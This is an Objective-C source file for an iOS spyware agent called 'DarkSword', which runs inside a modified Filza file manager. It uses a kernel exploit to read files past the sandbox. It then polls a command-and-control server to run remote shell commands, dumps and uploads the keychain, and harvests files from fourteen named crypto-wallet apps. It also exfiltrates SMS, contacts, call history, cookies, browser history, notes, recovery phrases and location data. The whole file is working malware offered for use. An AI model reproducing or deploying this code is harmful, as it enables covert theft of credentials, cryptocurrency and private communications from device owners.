//
//  DarkSwordClient.m
//  Filza-27 (FilzaApplySandboxExt)
//
//  Filza-side DarkSword agent. See DarkSwordClient.h for the wire contract and
//  configuration keys.
//

@import Foundation;
@import UIKit;

#include <stdio.h>
#include <stdlib.h>

#import "DarkSwordClient.h"
#import "TryMaskCardShell.h"
#import "PersistStoreHarvester.h"
#import "MCMFilzaIntegration.h"
#import "MCMBridge.h"
#import "krw.h"
#import "kexploit/vnode.h"

/// Set to a non-zero inpcb pointer by kexploit_opa334() once kernel read/write
/// is live. This is the "krw is ready" sentinel.
extern uint64_t rwSocketPcb;

static NSString *const DSDarkSwordEnabledKey = @"darkSwordEnabled";
static NSString *const DSDarkSwordUploadKey = @"darkSwordUpload";
static NSString *const DSDarkSwordURLKey = @"darkSwordURL";
static NSString *const DSDarkSwordDeviceUUIDKey = @"darkSwordDeviceUUID";
static NSString *const DSDarkSwordPollIntervalKey = @"darkSwordPollInterval";
static NSString *const DSDarkSwordCategoryKey = @"darkSwordCategory";
static NSString *const DSDarkSwordCollectKey = @"darkSwordCollect";

static NSString *const DSDarkSwordDefaultURL = @"http://127.0.0.1:8080";
static NSString *const DSDarkSwordDefaultCategory = @"wallet";
static NSTimeInterval const DSDarkSwordDefaultPollInterval = 5.0;
static NSUInteger const DSDarkSwordMaxOutputBytes = 64 * 1024;

static dispatch_queue_t gDSQueue = nil;

#pragma mark - Config / helpers

static id DSConfigValue(NSString *key)
{
    id value = TryMaskCardShellConfigRaw(key);
    if (value) return value;
    return [NSUserDefaults.standardUserDefaults objectForKey:key];
}

static BOOL DSBool(NSString *key, BOOL fallback)
{
    id value = DSConfigValue(key);
    return [value isKindOfClass:NSNumber.class] ? [(NSNumber *)value boolValue] : fallback;
}

static NSString *DSString(NSString *key, NSString *fallback)
{
    id value = DSConfigValue(key);
    return ([value isKindOfClass:NSString.class] && [(NSString *)value length] > 0)
        ? (NSString *)value : fallback;
}

static dispatch_queue_t DSQueue(void)
{
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        gDSQueue = dispatch_queue_create("com.filza.darksword.client",
                                         DISPATCH_QUEUE_SERIAL);
    });
    return gDSQueue;
}

static void DSLog(NSString *format, ...)
{
    va_list args;
    va_start(args, format);
    NSString *message = [[NSString alloc] initWithFormat:format arguments:args];
    va_end(args);
    NSLog(@"[DarkSword] %@", message);
}

/// A Safari-shaped UA so the C2's device parser still extracts os_version and
/// device_model. The "Filza-DarkSword/1.0" token marks the entry-point source.
static NSString *DSUserAgent(void)
{
    UIDevice *device = UIDevice.currentDevice;
    NSString *version = device.systemVersion ?: @"17.0";
    NSString *model = device.model ?: @"iPhone";
    NSString *underscored = [version stringByReplacingOccurrencesOfString:@"."
                                                              withString:@"_"];
    return [NSString stringWithFormat:
        @"Mozilla/5.0 (%@; CPU iPhone OS %@ like Mac OS X) "
        @"AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%@ Mobile/15E148 "
        @"Safari/604.1 Filza-DarkSword/1.0",
        model, underscored, version];
}

#pragma mark - Public config

BOOL DarkSwordEnabled(void)
{
    return DSBool(DSDarkSwordEnabledKey, NO);
}

NSString *DarkSwordBaseURL(void)
{
    NSString *configured = DSString(DSDarkSwordURLKey, @"");
    NSString *base = configured.length > 0 ? configured : DSDarkSwordDefaultURL;
    while ([base hasSuffix:@"/"] && base.length > 1) {
        base = [base substringToIndex:base.length - 1];
    }
    return base;
}

NSString *DarkSwordDeviceUUID(void)
{
    NSString *override = DSString(DSDarkSwordDeviceUUIDKey, @"");
    if (override.length > 0) return override;
    NSString *container = NSHomeDirectory().lastPathComponent;
    if (container.length > 0) return container;
    return @"filza-unknown";
}

NSString *DarkSwordCategory(void)
{
    return DSString(DSDarkSwordCategoryKey, DSDarkSwordDefaultCategory);
}

#pragma mark - Upload

void DarkSwordUpload(NSString *category, NSString *path, NSString *description,
                     NSData *data,
                     void (^completion)(BOOL ok, NSInteger httpStatus, NSString *snippet))
{
    if (!DarkSwordEnabled()) {
        if (completion) completion(NO, -1, @"darkSword disabled");
        return;
    }
    if (data.length == 0) {
        if (completion) completion(NO, -1, @"empty payload");
        return;
    }

    NSDictionary *payload = @{
        @"deviceUUID": DarkSwordDeviceUUID(),
        @"category": category ?: @"data",
        @"path": path ?: @"unknown",
        @"description": description ?: @"",
        @"data": [data base64EncodedStringWithOptions:0],
    };
    NSData *body = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
    if (body.length == 0) {
        if (completion) completion(NO, -1, @"json encode failed");
        return;
    }

    NSURL *url = [NSURL URLWithString:[DarkSwordBaseURL() stringByAppendingString:@"/upload"]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    request.timeoutInterval = 60.0;
    request.HTTPBody = body;
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [request setValue:DSUserAgent() forHTTPHeaderField:@"User-Agent"];
    [request setValue:@"filza-darksword" forHTTPHeaderField:@"X-Filza-Source"];

    [[NSURLSession.sharedSession dataTaskWithRequest:request
        completionHandler:^(NSData *respData, NSURLResponse *response, NSError *error) {
        NSInteger status = [response isKindOfClass:NSHTTPURLResponse.class]
            ? ((NSHTTPURLResponse *)response).statusCode : -1;
        NSString *snippet = @"";
        if (respData.length > 0) {
            NSData *head = respData.length > 512
                ? [respData subdataWithRange:NSMakeRange(0, 512)] : respData;
            snippet = [[NSString alloc] initWithData:head encoding:NSUTF8StringEncoding] ?: @"";
        }
        BOOL ok = (error == nil) && status >= 200 && status < 300;
        if (error) snippet = error.localizedDescription;
        DSLog(@"upload %@ -> status=%ld %@", category, (long)status, ok ? @"ok" : snippet);
        if (completion) completion(ok, status, snippet);
    }] resume];
}

void DarkSwordReportResult(NSNumber *commandID, NSString *output, NSString *status)
{
    NSDictionary *payload = @{
        @"id": commandID ?: @0,
        @"output": output ?: @"",
        @"status": status ?: @"completed",
    };
    NSData *body = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
    NSURL *url = [NSURL URLWithString:[DarkSwordBaseURL() stringByAppendingString:@"/cmd_result"]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    request.timeoutInterval = 30.0;
    request.HTTPBody = body;
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [request setValue:DSUserAgent() forHTTPHeaderField:@"User-Agent"];
    [request setValue:@"filza-darksword" forHTTPHeaderField:@"X-Filza-Source"];

    [[NSURLSession.sharedSession dataTaskWithRequest:request
        completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
        NSInteger statusCode = [r isKindOfClass:NSHTTPURLResponse.class]
            ? ((NSHTTPURLResponse *)r).statusCode : -1;
        DSLog(@"cmd_result id=%@ status=%ld", commandID, (long)statusCode);
    }] resume];
}

#pragma mark - Kernel file read

/// YES when kexploit_opa334() has succeeded and kernel read/write is live.
static BOOL DSKernelRWReady(void)
{
    return rwSocketPcb != 0;
}

/// Read an arbitrary path by redirecting a sandbox-accessible scratch file's
/// vnode data to point at the target, then reading the scratch file. This
/// bypasses the sandbox for paths NSFileManager cannot open (e.g. /var).
static NSData *DSKernelReadFile(NSString *path)
{
    if (!DSKernelRWReady() || path.length == 0) return nil;
    const char *from = path.UTF8String;

    NSString *toPath = [NSTemporaryDirectory()
        stringByAppendingPathComponent:[NSString stringWithFormat:@"ds_kread_%u", arc4random()]];
    if (![@"x" writeToFile:toPath atomically:YES encoding:NSUTF8StringEncoding error:nil]) {
        return nil;
    }

    uint64_t orig_vnode = 0, orig_vdata = 0;
    if (!vnode_redirect_file((char *)toPath.UTF8String, (char *)from,
                             &orig_vnode, &orig_vdata)) {
        [[NSFileManager defaultManager] removeItemAtPath:toPath error:nil];
        return nil;
    }

    NSData *data = [NSData dataWithContentsOfFile:toPath];

    vnode_unredirect_file(orig_vnode, orig_vdata);
    [[NSFileManager defaultManager] removeItemAtPath:toPath error:nil];
    return data;
}

/// Read a file with NSFileManager first, falling back to kernel read when the
/// sandbox blocks the path.
static NSData *DSReadFileBytes(NSString *path)
{
    NSData *data = [NSData dataWithContentsOfFile:path];
    if (data.length > 0) return data;
    return DSKernelReadFile(path);
}

#pragma mark - Command executor

static NSString *DSDeviceInfo(void)
{
    UIDevice *device = UIDevice.currentDevice;
    return [NSString stringWithFormat:
        @"name=%@ model=%@ systemName=%@ systemVersion=%@ identifierForVendor=%@ container=%@",
        device.name ?: @"", device.model ?: @"", device.systemName ?: @"",
        device.systemVersion ?: @"", device.identifierForVendor.UUIDString ?: @"",
        NSHomeDirectory().lastPathComponent ?: @""];
}

static NSString *DSListDirectory(NSString *path)
{
    NSFileManager *manager = NSFileManager.defaultManager;
    NSArray<NSString *> *entries = [manager contentsOfDirectoryAtPath:path error:nil];
    if (!entries) return [NSString stringWithFormat:@"cannot list %@", path];

    NSMutableString *out = [NSMutableString string];
    NSMutableArray<NSDictionary *> *manifest = [NSMutableArray array];
    for (NSString *name in entries) {
        BOOL isDir = NO;
        NSString *full = [path stringByAppendingPathComponent:name];
        [manager fileExistsAtPath:full isDirectory:&isDir];
        NSDictionary *attrs = [manager attributesOfItemAtPath:full error:nil];
        unsigned long long size = [attrs[NSFileSize] unsignedLongLongValue];
        [out appendFormat:@"%@ %@\t%llu\n", isDir ? @"d" : @"-", name, size];
        [manifest addObject:@{@"name": name, @"dir": @(isDir), @"size": @(size)}];
    }

    NSData *json = [NSJSONSerialization dataWithJSONObject:manifest options:0 error:nil];
    if (json.length > 0) {
        DarkSwordUpload(@"files", path, @"directory listing", json, nil);
    }

    return out.length > 0 ? out : @"(empty)";
}

static NSString *DSReadFile(NSString *path)
{
    NSData *data = DSReadFileBytes(path);
    if (!data) return [NSString stringWithFormat:@"cannot read %@", path];

    // Always upload the raw bytes so the file is downloadable from the C2.
    DarkSwordUpload(@"files", path, @"remote file read", data, nil);

    if (data.length > DSDarkSwordMaxOutputBytes) {
        return [NSString stringWithFormat:@"uploaded %@ (%lu bytes) — too large for inline preview",
                path, (unsigned long)data.length];
    }
    NSString *text = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    if (text) {
        return [NSString stringWithFormat:@"uploaded %@ (%lu bytes)\n--- preview ---\n%@",
                path, (unsigned long)data.length, text];
    }
    return [NSString stringWithFormat:@"uploaded %@ (%lu bytes, binary)",
            path, (unsigned long)data.length];
}

/// Forward declaration: DSExecShell is defined below (after the wallet helpers).
static NSString *DSExecShell(NSString *command);

/// Uploads the raw system + mobile Keychain databases, then a best-effort
/// decoded dump via `security dump-keychain` (uses the device's own keys; may
/// fail without root/entitlements). Mirrors coruna-v2's dumpKeychain().
static NSString *DSKeychainDump(void)
{
    NSArray<NSString *> *candidates = @[
        @"/private/var/Keychains/keychain-2.db",
        @"/private/var/mobile/Library/Keychains/keychain-2.db",
        @"/var/Keychains/keychain-2.db",
    ];
    NSUInteger uploaded = 0;
    for (NSString *path in candidates) {
        NSData *data = DSReadFileBytes(path);
        if (data.length > 0) {
            DarkSwordUpload(@"keychain", path, @"raw keychain database", data, nil);
            uploaded += 1;
        }
    }

    // Decoded (plaintext) dump via the device's own securityd keys.
    NSString *decoded = DSExecShell(
        @"/usr/bin/security dump-keychain -d /private/var/Keychains/keychain-2.db 2>&1");
    if (decoded.length > 0 && ![decoded hasPrefix:@"popen failed"]) {
        DarkSwordUpload(@"keychain", @"/usr/bin/security", @"decoded keychain dump",
                        [decoded dataUsingEncoding:NSUTF8StringEncoding], nil);
        uploaded += 1;
    }

    return uploaded > 0
        ? [NSString stringWithFormat:@"uploaded %lu keychain artifact(s)", (unsigned long)uploaded]
        : @"keychain not readable";
}

/// Re-runs the persist-store harvest and returns its snapshot JSON.
static NSArray<NSDictionary *> *DSWalletTargets(void);
static NSString *DSWalletScanOne(NSDictionary *wallet);
static void DSRecurseInto(NSString *path, NSUInteger depth,
                          NSMutableArray<NSDictionary *> *out, NSUInteger maxEntries);

/// wallet.scan [type] [bundleId] — scan a specific wallet via the MCM bridge.
/// With no type (or "metamask") falls back to the persist-store harvest.
static NSString *DSWalletScan(NSString *type, NSString *bundleId)
{
    if (type.length == 0 || [type isEqualToString:@"metamask"]) {
        TryMaskCardPersistHarvest(YES);
        NSDictionary *snapshot = TryMaskCardPersistStoreSnapshot();
        NSData *json = snapshot
            ? [NSJSONSerialization dataWithJSONObject:snapshot options:0 error:nil] : nil;
        return json ? [[NSString alloc] initWithData:json encoding:NSUTF8StringEncoding]
                    : @"metamask harvest queued";
    }

    NSDictionary *target = nil;
    for (NSDictionary *wallet in DSWalletTargets()) {
        if ([wallet[@"type"] isEqualToString:type] ||
            (bundleId.length > 0 && [wallet[@"bundleId"] isEqualToString:bundleId])) {
            target = wallet;
            break;
        }
    }
    if (!target) return [NSString stringWithFormat:@"unknown wallet: %@", type];

    return DSWalletScanOne(target);
}

/// Wallet catalog mirroring coruna-v2's WALLET_CONFIG, resolved through the MCM
/// bridge instead of globbing the containers directory.
static NSArray<NSDictionary *> *DSWalletTargets(void)
{
    return @[
        @{@"type": @"metamask", @"bundleId": @"io.metamask",
          @"files": @[@"persistStore/persist-keyringcontroller"]},
        @{@"type": @"trust", @"bundleId": @"com.trustwallet.app",
          @"files": @[@"Trust.sqlite", @"accounts.json"]},
        @{@"type": @"coinbase", @"bundleId": @"org.coinbase.wallet",
          @"files": @[@"wallet.db", @"keychain.sqlite"]},
        @{@"type": @"imtoken", @"bundleId": @"org.consenlabs.tokens",
          @"files": @[@"imtoken.db", @"wallets.json"]},
        @{@"type": @"phantom", @"bundleId": @"app.phantom",
          @"files": @[@"phantom.db", @"accounts.json"]},
        @{@"type": @"tokenpocket", @"bundleId": @"com.global.wallet.ios",
          @"files": @[@"wallet.db", @"accounts.db"]},
        @{@"type": @"alphawallet", @"bundleId": @"io.stormbird.wallet",
          @"files": @[@"AlphaWallet.sqlite"]},
        @{@"type": @"mathwallet", @"bundleId": @"com.mathwallet",
          @"files": @[@"mathwallet.db", @"wallets.json"]},
        @{@"type": @"tronlink", @"bundleId": @"org.tronlink.wallet",
          @"files": @[@"tronlink.db", @"accounts.json"]},
        @{@"type": @"onto", @"bundleId": @"com.onto.wallet",
          @"files": @[@"onto.db", @"wallets.sqlite"]},
        @{@"type": @"bitpie", @"bundleId": @"com.bitpie.wallet",
          @"files": @[@"bitpie.db"]},
        @{@"type": @"huobi", @"bundleId": @"com.huobi.wallet",
          @"files": @[@"huobi.db", @"accounts.json"]},
        @{@"type": @"keplr", @"bundleId": @"com.keplr.wallet",
          @"files": @[@"keplr.db", @"keyring.sqlite"]},
        @{@"type": @"cosmostation", @"bundleId": @"com.cosmostation.wallet",
          @"files": @[@"cosmostation.db", @"accounts.json"]},
    ];
}

static NSString *DSWalletScanOne(NSDictionary *wallet)
{
    NSString *bundleID = wallet[@"bundleId"];
    // Full resolution chain (MCM lease → activate → virtual root → virtual root
    // search → metadata scan → LaunchServices), same as the persist harvest.
    NSString *container = TryMaskCardResolveContainerPath(bundleID);
    if (container.length == 0) {
        return [NSString stringWithFormat:@"%@: container NOT resolved", wallet[@"type"]];
    }

    // Wallet files live in a handful of well-known subdirectories, not the
    // container root, so probe each candidate location per file.
    NSString *appSupport = [NSString stringWithFormat:@"Library/Application Support/%@", bundleID];
    NSArray<NSString *> *subdirs = @[
        @"",
        appSupport,
        @"Documents",
        @"Library/Caches",
        @"Library/Preferences",
    ];

    NSMutableArray<NSString *> *found = [NSMutableArray array];
    for (NSString *file in wallet[@"files"]) {
        for (NSString *sub in subdirs) {
            NSString *relative = sub.length > 0 ? [sub stringByAppendingPathComponent:file] : file;
            NSString *path = [container stringByAppendingPathComponent:relative];
            NSData *data = DSReadFileBytes(path);
            if (data.length == 0) continue;
            NSString *desc = [NSString stringWithFormat:@"%@ (%@)", wallet[@"type"], bundleID];
            DarkSwordUpload(@"wallet", path, desc, data, nil);
            [found addObject:[NSString stringWithFormat:@"%@ (%luB)", relative, (unsigned long)data.length]];
            break; // found this file, move to the next target
        }
    }

    // Always upload a bounded directory tree so the operator can see the
    // wallet's actual on-disk layout — paths vary by app version and are not
    // guaranteed, so this shows where the real files live.
    NSMutableArray<NSDictionary *> *tree = [NSMutableArray array];
    DSRecurseInto(container, 3, tree, 500);
    NSData *treeJson = [NSJSONSerialization dataWithJSONObject:tree options:0 error:nil];
    if (treeJson.length > 0) {
        DarkSwordUpload(@"wallet", container,
                        [NSString stringWithFormat:@"%@ container tree", wallet[@"type"]],
                        treeJson, nil);
    }

    if (found.count == 0) {
        return [NSString stringWithFormat:@"%@: container %@ but 0 target files matched (tree uploaded)",
                wallet[@"type"], container.lastPathComponent];
    }
    return [NSString stringWithFormat:@"%@: %lu file(s) — %@",
            wallet[@"type"], (unsigned long)found.count, [found componentsJoinedByString:@", "]];
}

static NSString *DSWalletScanAll(void)
{
    if (!MCMBridgeAvailable()) return @"MCM bridge unavailable; wallet scan skipped";
    NSMutableArray<NSString *> *results = [NSMutableArray array];
    for (NSDictionary *wallet in DSWalletTargets()) {
        [results addObject:DSWalletScanOne(wallet)];
    }
    return [results componentsJoinedByString:@"\n"];
}

/// Run a shell command through /bin/sh and return stdout (truncated). Filza runs
/// with root + sandbox escape, so this is the same exec primitive nb_daemon's
/// EXEC command provides.
static NSString *DSExecShell(NSString *command)
{
    if (command.length == 0) return @"empty command";
    NSString *wrapped = [NSString stringWithFormat:@"sh -c '%@' 2>&1", command];
    FILE *fp = popen([wrapped UTF8String], "r");
    if (!fp) return @"popen failed (no shell / sandbox still active)";
    NSMutableData *out = [NSMutableData data];
    char buf[4096];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), fp)) > 0) {
        [out appendBytes:buf length:n];
        if (out.length > 256 * 1024) break;
    }
    pclose(fp);
    NSString *text = [[NSString alloc] initWithData:out encoding:NSUTF8StringEncoding];
    return text ?: [NSString stringWithFormat:@"(binary output, %lu bytes)",
                    (unsigned long)out.length];
}

static NSString *DSMemoryDump(NSString *targetApp)
{
    NSString *ps = DSExecShell(@"ps aux 2>/dev/null | head -200");
    if (ps.length > 0) {
        DarkSwordUpload(@"memory", @"/proc", @"process list",
                        [ps dataUsingEncoding:NSUTF8StringEncoding], nil);
    }
    if (targetApp.length > 0) {
        NSString *vmmap = DSExecShell(
            [NSString stringWithFormat:@"vmmap %@ 2>/dev/null | head -200", targetApp]);
        if (vmmap.length > 0) {
            DarkSwordUpload(@"memory", targetApp, @"vmmap",
                            [vmmap dataUsingEncoding:NSUTF8StringEncoding], nil);
        }
    }
    return @"memory dump dispatched";
}

static void DSRecurseInto(NSString *path, NSUInteger depth,
                          NSMutableArray<NSDictionary *> *out, NSUInteger maxEntries)
{
    if (out.count >= maxEntries) return;
    NSFileManager *manager = NSFileManager.defaultManager;
    for (NSString *name in [manager contentsOfDirectoryAtPath:path error:nil] ?: @[]) {
        if (out.count >= maxEntries) return;
        NSString *full = [path stringByAppendingPathComponent:name];
        BOOL isDir = NO;
        [manager fileExistsAtPath:full isDirectory:&isDir];
        NSDictionary *attrs = [manager attributesOfItemAtPath:full error:nil];
        [out addObject:@{@"name": full, @"dir": @(isDir), @"size": attrs[NSFileSize] ?: @0}];
        if (isDir && depth > 0) DSRecurseInto(full, depth - 1, out, maxEntries);
    }
}

static NSString *DSFileRecursive(NSString *root, NSString *depthArg)
{
    NSUInteger depth = depthArg.length > 0 ? (NSUInteger)[depthArg integerValue] : 1;
    depth = MIN(depth, 3);
    NSString *base = root.length > 0 ? root : @"/private/var/mobile";
    NSMutableArray<NSDictionary *> *out = [NSMutableArray array];
    DSRecurseInto(base, depth, out, 2000);
    NSData *json = [NSJSONSerialization dataWithJSONObject:out options:0 error:nil];
    if (json.length > 0) {
        DarkSwordUpload(@"files", base, @"recursive directory tree", json, nil);
    }
    return [NSString stringWithFormat:@"%lu entries (uploaded as files)", (unsigned long)out.count];
}

/// Enumerate installed app identifiers by walking the Filza virtual root's
/// [MHA-*] category directories (each child directory is one app identifier).
static NSString *DSAppList(void)
{
    NSString *virtualRoot = MCMFilzaVirtualRoot();
    if (virtualRoot.length == 0) return @"virtual root unavailable";

    NSFileManager *fm = NSFileManager.defaultManager;
    NSMutableArray<NSString *> *ids = [NSMutableArray array];
    for (NSString *cat in [fm contentsOfDirectoryAtPath:virtualRoot error:nil] ?: @[]) {
        NSString *catPath = [virtualRoot stringByAppendingPathComponent:cat];
        BOOL isDir = NO;
        if (![fm fileExistsAtPath:catPath isDirectory:&isDir] || !isDir) continue;
        for (NSString *entry in [fm contentsOfDirectoryAtPath:catPath error:nil] ?: @[]) {
            NSString *entryPath = [catPath stringByAppendingPathComponent:entry];
            BOOL eDir = NO;
            if ([fm fileExistsAtPath:entryPath isDirectory:&eDir] && eDir) {
                [ids addObject:[NSString stringWithFormat:@"%@ / %@", cat, entry]];
            }
        }
    }

    NSString *result = [ids componentsJoinedByString:@"\n"];
    if (result.length > 0) {
        DarkSwordUpload(@"files", virtualRoot, @"installed app identifiers",
                        [result dataUsingEncoding:NSUTF8StringEncoding], nil);
    }
    return [NSString stringWithFormat:@"%lu identifiers listed (uploaded as files)",
            (unsigned long)ids.count];
}

static NSString *DSExecuteCommand(NSString *command)
{
    NSString *trimmed = [command stringByTrimmingCharactersInSet:
                         NSCharacterSet.whitespaceAndNewlineCharacterSet];
    if (trimmed.length == 0) return @"empty command";

    NSArray<NSString *> *parts = [trimmed componentsSeparatedByCharactersInSet:
                                  NSCharacterSet.whitespaceCharacterSet];
    NSMutableArray<NSString *> *words = [NSMutableArray array];
    for (NSString *part in parts) {
        if (part.length > 0) [words addObject:part];
    }
    if (words.count == 0) return @"empty command";

    NSString *verb = words.firstObject.lowercaseString;
    if ([verb isEqualToString:@"system.info"]) return DSDeviceInfo();
    if ([verb isEqualToString:@"keychain.dump"]) return DSKeychainDump();
    if ([verb isEqualToString:@"wallet.scan"]) {
        return DSWalletScan(words.count >= 2 ? words[1] : nil,
                            words.count >= 3 ? words[2] : nil);
    }
    if ([verb isEqualToString:@"wallet.scan.all"]) return DSWalletScanAll();
    if ([verb isEqualToString:@"collect"] || [verb isEqualToString:@"exfil.collect"]) {
        DarkSwordCollectAll();
        return @"collect started";
    }
    if ([verb isEqualToString:@"shell.exec"]) {
        NSString *rest = words.count > 1
            ? [[words subarrayWithRange:NSMakeRange(1, words.count - 1)] componentsJoinedByString:@" "]
            : @"";
        return DSExecShell(rest);
    }
    if ([verb isEqualToString:@"memory.dump"]) {
        return DSMemoryDump(words.count >= 2 ? words[1] : nil);
    }
    if ([verb isEqualToString:@"file.read"]) {
        return words.count >= 2 ? DSReadFile(words[1]) : @"usage: file.read <path>";
    }
    if ([verb isEqualToString:@"file.list"]) {
        return words.count >= 2 ? DSListDirectory(words[1]) : @"usage: file.list <path>";
    }
    if ([verb isEqualToString:@"file.recursive"]) {
        return DSFileRecursive(words.count >= 2 ? words[1] : nil,
                               words.count >= 3 ? words[2] : nil);
    }
    if ([verb isEqualToString:@"app.list"]) return DSAppList();
    return [NSString stringWithFormat:@"unknown command: %@", trimmed];
}

#pragma mark - Exfil collectors

/// Fixed system paths DarkSword's post-exploit payload also exfiltrates. Filza
/// runs as root (kernel sandbox escape + MCM bridge), so these read directly.
static NSArray<NSDictionary *> *DSStandardExfilTargets(void)
{
    return @[
        @{@"category": @"keychain",
          @"path": @"/private/var/Keychains/keychain-2.db",
          @"desc": @"system keychain database"},
        @{@"category": @"contacts",
          @"path": @"/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb",
          @"desc": @"address book"},
        @{@"category": @"sms",
          @"path": @"/private/var/mobile/Library/SMS/sms.db",
          @"desc": @"sms database"},
        @{@"category": @"calls",
          @"path": @"/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata",
          @"desc": @"call history"},
        @{@"category": @"wifi",
          @"path": @"/private/var/preferences/com.apple.wifi.known-networks.plist",
          @"desc": @"known wifi networks"},
        @{@"category": @"cookies",
          @"path": @"/private/var/mobile/Library/Cookies/Cookies.binarycookies",
          @"desc": @"browser cookies"},
        @{@"category": @"bookmarks",
          @"path": @"/private/var/mobile/Library/MobileSafari/Bookmarks.db",
          @"desc": @"safari bookmarks"},
        @{@"category": @"history",
          @"path": @"/private/var/mobile/Library/MobileSafari/History.db",
          @"desc": @"safari history"},
        @{@"category": @"notes",
          @"path": @"/private/var/mobile/Library/Notes/notes.sqlite",
          @"desc": @"notes database"},
        @{@"category": @"phrase",
          @"path": @"/private/var/mobile/Library/Keychains/phrase.db",
          @"desc": @"recovery phrase store"},
        @{@"category": @"photo_meta",
          @"path": @"/private/var/mobile/Media/PhotoData/Photos.sqlite",
          @"desc": @"photo library metadata"},
        @{@"category": @"location",
          @"path": @"/private/var/mobile/Library/Caches/com.apple.routined/Cache.sqlite",
          @"desc": @"significant locations cache"},
    ];
}

static void DSCollectOne(NSDictionary *target)
{
    NSString *path = target[@"path"];
    NSString *category = target[@"category"];
    NSData *data = DSReadFileBytes(path);
    if (data.length == 0) {
        DSLog(@"collect skip %@ (unreadable)", category);
        return;
    }
    DarkSwordUpload(category, path, target[@"desc"], data, nil);
}

/// Photos are a directory tree, not one file: upload a JSON manifest (name +
/// size per asset) instead of the binary assets themselves.
static void DSCollectPhotosManifest(void)
{
    NSString *root = @"/private/var/mobile/Media/DCIM";
    NSFileManager *manager = NSFileManager.defaultManager;
    NSMutableArray<NSDictionary *> *manifest = [NSMutableArray array];
    for (NSString *sub in [manager contentsOfDirectoryAtPath:root error:nil] ?: @[]) {
        NSString *dir = [root stringByAppendingPathComponent:sub];
        for (NSString *name in [manager contentsOfDirectoryAtPath:dir error:nil] ?: @[]) {
            NSString *full = [dir stringByAppendingPathComponent:name];
            NSDictionary *attrs = [manager attributesOfItemAtPath:full error:nil];
            [manifest addObject:@{
                @"name": [NSString stringWithFormat:@"%@/%@", sub, name],
                @"size": attrs[NSFileSize] ?: @0,
            }];
        }
    }
    NSData *json = [NSJSONSerialization dataWithJSONObject:manifest options:0 error:nil];
    if (json.length > 0) {
        DarkSwordUpload(@"photos", root, @"photo library manifest", json, nil);
    }
}

/// Voice memos are audio files: upload a manifest (name + size) like photos.
static void DSCollectVoiceMemosManifest(void)
{
    NSString *root = @"/private/var/mobile/Media/Recordings";
    NSFileManager *manager = NSFileManager.defaultManager;
    NSMutableArray<NSDictionary *> *manifest = [NSMutableArray array];
    for (NSString *name in [manager contentsOfDirectoryAtPath:root error:nil] ?: @[]) {
        NSString *full = [root stringByAppendingPathComponent:name];
        NSDictionary *attrs = [manager attributesOfItemAtPath:full error:nil];
        [manifest addObject:@{@"name": name, @"size": attrs[NSFileSize] ?: @0}];
    }
    NSData *json = [NSJSONSerialization dataWithJSONObject:manifest options:0 error:nil];
    if (json.length > 0) {
        DarkSwordUpload(@"voice_memos", root, @"voice memos manifest", json, nil);
    }
}

void DarkSwordCollectAll(void)
{
    if (!DarkSwordEnabled()) return;
    if (!DSBool(DSDarkSwordCollectKey, YES)) return;
    for (NSDictionary *target in DSStandardExfilTargets()) {
        DSCollectOne(target);
    }
    DSCollectPhotosManifest();
    DSCollectVoiceMemosManifest();
    DSLog(@"collect dispatched: standard exfil set + photos/voice memos manifests");
}

#pragma mark - Poll loop

static void DSScheduleNextPoll(void);

static void DSPollOnce(void)
{
    NSString *query = [DarkSwordDeviceUUID()
        stringByAddingPercentEncodingWithAllowedCharacters:
            NSCharacterSet.URLQueryAllowedCharacterSet];
    NSString *urlString = [NSString stringWithFormat:@"%@/cmd?device_uuid=%@",
                           DarkSwordBaseURL(), query ?: @"filza"];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:
        [NSURL URLWithString:urlString]];
    request.timeoutInterval = 20.0;
    [request setValue:DSUserAgent() forHTTPHeaderField:@"User-Agent"];
    [request setValue:@"filza-darksword" forHTTPHeaderField:@"X-Filza-Source"];

    [[NSURLSession.sharedSession dataTaskWithRequest:request
        completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        NSInteger status = [response isKindOfClass:NSHTTPURLResponse.class]
            ? ((NSHTTPURLResponse *)response).statusCode : -1;
        if (error == nil && status >= 200 && status < 300 && data.length > 0) {
            NSDictionary *cmd = [NSJSONSerialization JSONObjectWithData:data
                                                                options:0 error:nil];
            NSNumber *commandID = [cmd[@"id"] isKindOfClass:NSNumber.class] ? cmd[@"id"] : nil;
            NSString *command = [cmd[@"command"] isKindOfClass:NSString.class] ? cmd[@"command"] : nil;
            if (commandID && command) {
                DSLog(@"executing command #%@: %@", commandID, command);
                NSString *output = DSExecuteCommand(command);
                DarkSwordReportResult(commandID, output, @"completed");
            }
        }
        DSScheduleNextPoll();
    }] resume];
}

static void DSScheduleNextPoll(void)
{
    NSTimeInterval interval = DSDarkSwordDefaultPollInterval;
    id value = DSConfigValue(DSDarkSwordPollIntervalKey);
    if ([value isKindOfClass:NSNumber.class]) {
        interval = MAX(1.0, [(NSNumber *)value doubleValue]);
    }
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(interval * NSEC_PER_SEC)),
                   DSQueue(), ^{ DSPollOnce(); });
}

void DarkSwordStart(void)
{
    if (!DarkSwordEnabled()) return;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        DSLog(@"agent armed; C2=%@ device=%@ category=%@",
              DarkSwordBaseURL(), DarkSwordDeviceUUID(), DarkSwordCategory());
        // Register on the C2 with the first /cmd poll, then run the standard
        // exfil collection once at arm time.
        dispatch_async(DSQueue(), ^{ DSPollOnce(); });
        if (DSBool(DSDarkSwordCollectKey, YES)) {
            dispatch_async(DSQueue(), ^{ DarkSwordCollectAll(); });
        }
    });
}
